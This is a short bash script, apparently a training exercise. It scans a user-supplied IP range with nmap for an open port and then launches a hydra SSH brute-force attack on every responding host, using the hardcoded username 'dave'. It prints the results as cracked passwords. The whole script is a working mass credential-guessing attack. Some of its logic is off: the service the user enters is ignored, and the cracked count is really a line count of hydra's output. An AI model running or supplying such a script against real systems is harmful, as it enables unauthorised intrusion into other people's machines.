#!/bin/bash

#1.	Get from the user an IP range to scan (read) 
echo "Enter an IP range to scan: "
read SCAN

#2.	Get from the user the service and the port to attack (read) + (nmap)
#	-p	print:
read -p "Enter the service to scan: " SERVICE
read -p "Enter the port to scan: " PORT

nmap -p $PORT $SCAN -oG res.lst
cat res.lst | grep open | awk '{print $2}' > res2.lst
clear	#clears the screen
echo "[*] Found $(cat res2.lst | wc -l) Devices running the $SERVICE service."

#3.	Run Brute Force of the found devices (hydra)
echo "[*] Running Brute Force"
hydra -l dave -P DnufnrP9 -M res2.lst ssh -t 4 > res3.lst
echo "[*] Cracked $(cat res3.lst | wc -l) Devices."
#4.	Display to the user all the cracked passwords (text manipulation)

cat res3.lst


